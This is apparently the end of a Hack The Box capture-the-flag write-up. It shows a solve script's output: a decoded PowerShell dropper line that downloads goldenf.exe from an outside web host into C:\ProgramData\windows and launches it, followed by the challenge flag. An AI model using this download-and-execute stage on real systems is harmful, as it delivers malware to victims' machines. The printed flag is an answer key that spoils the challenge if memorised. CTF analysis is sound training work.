$ pwsh solve.ps1
$path ="C:\ProgramData\windows\goldenf.exe";$exists = Test-Path -Path $path -PathType Leaf;if ( $exists ){Start-Process $path}else{mkdir "C:\ProgramData\windows";Invoke-WebRequest -Uri https://thoccarthmercenaries.edu.tho/wp-content/goldenf.exe -OutFile $path;$flag="HTB{**********************************}";Start-Process $path}
```
woooooo :)
<details> 
    <summary>Flag</summary>
HTB{g0ld3n_F4ng_1s_n0t_st34lthy_3n0ugh}</details>